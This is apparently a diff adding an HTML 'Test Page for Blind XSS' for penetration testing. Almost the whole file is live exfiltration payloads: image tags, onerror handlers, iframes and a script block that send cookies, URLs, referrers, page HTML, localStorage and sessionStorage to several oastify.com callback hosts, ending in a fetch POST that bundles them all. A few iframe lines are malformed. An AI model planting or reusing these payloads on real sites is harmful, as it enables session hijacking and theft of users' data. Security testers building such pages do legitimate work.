@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Page</title>
+</head>
+<body>
+    <h1>Test Page for Blind XSS</h1>
+
+    <!-- Basic Image Exfiltration -->
+    <img src="https://bgvomtxkkv1j6cfwk3oe8akbs2ytmkc81.oastify.com/backdoor" />
+
+    <!-- Image Error-Based Exfiltration -->
+    <img src="x" onerror="this.src='https://suq50ab1ycf0kttdyk2vmrys6jca01vpk.oastify.com/log?url='+encodeURIComponent(document.URL)+'&ref='+encodeURIComponent(document.referrer)+'&cookie='+encodeURIComponent(document.cookie)" />
+
+    <!-- Hidden Image to Leak Content -->
+    <img style="display:none;" src="https://re94k9v0ibzz4sdcijmu6qirqiw9k0poe.oastify.com/imgTAG" />
+
+    <!-- iFrame for Exfiltration -->
+    <iframe src="https://im8vs03rq27qcjl3qaulehqiy940srkf9.oastify.com/iframe?data="+document.body.innerHTML></iframe>
+
+    <!-- iFrame to Leak URL, Referrer, and Cookies -->
+    <iframe src="http://im8vs03rq27qcjl3qaulehqiy940srkf9.oastify.com/log?url='+encodeURIComponent(document.URL)+'&ref='+encodeURIComponent(document.referrer)+'&cookie='+encodeURIComponent(document.cookie)"></iframe>
+
+    <!-- iFrame to Leak Full Page HTML -->
+    <iframe src="http://im8vs03rq27qcjl3qaulehqiy940srkf9.oastify.com/collect?data="+document.body.innerHTML></iframe>
+
+    <!-- JavaScript-Based Data Exfiltration -->
+    <script>
+        // Send cookies and URL
+        var img1 = new Image();
+        img1.src = "https://z99cfhq8dju7z08kdrh21ydzlqrhf89wy.oastify.com/script?cookies=" + encodeURIComponent(document.cookie) + "&url=" + encodeURIComponent(document.URL);
+
+        // Send entire page body HTML
+        var img2 = new Image();
+        img2.src = "https://kc0xi2ttg4xs2lb5gckn4jgkobu2iteh3.oastify.com/log?innerHTML=" + encodeURIComponent(document.body.innerHTML) + "&url=" + encodeURIComponent(document.URL);
+
+        // Send title, URL, and body content
+        var img3 = new Image();
+        img3.src = "https://xpqavf66tha5fyoitpx0hwtx1o7fv6suh.oastify.com/log?url=" + encodeURIComponent(document.URL) + "&title=" + encodeURIComponent(document.title) + "&body=" + encodeURIComponent(document.body.innerText);
+
+        // Stealthy background request to test execution
+        new Image().src = "https://3y2g4lfc2njbo4xo2v66q223augl4c20r.oastify.com";
+
+        // Inline JavaScript Execution Test
+        new Image().src = "https://3y2g4lfc2njbo4xo2v66q223augl4c20r.oastify.com/inlineJStesting";
+
+        // Exfiltrate localStorage if accessible
+        try {
+            var localData = JSON.stringify(localStorage);
+            var img4 = new Image();
+            img4.src = "https://0lmdri29pk68b1klpst3dzp0xr3iraky9.oastify.com/localStorage?data=" + encodeURIComponent(localData);
+        } catch (e) {}
+
+        // Exfiltrate sessionStorage if accessible
+        try {
+            var sessionData = JSON.stringify(sessionStorage);
+            var img5 = new Image();
+            img5.src = "https://0lmdri29pk68b1klpst3dzp0xr3iraky9.oastify.com/sessionStorage?data=" + encodeURIComponent(sessionData);
+        } catch (e) {}
+
+        // Fetch API (More Reliable for Large Data)
+        fetch("https://0lmdri29pk68b1klpst3dzp0xr3iraky9.oastify.com/fetch", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                url: document.URL,
+                referrer: document.referrer,
+                title: document.title,
+                cookies: document.cookie,
+                localStorage: localStorage,
+                sessionStorage: sessionStorage,
+                bodyContent: document.body.innerHTML
+            })
+        });
+    </script>
+</body>
+</html>
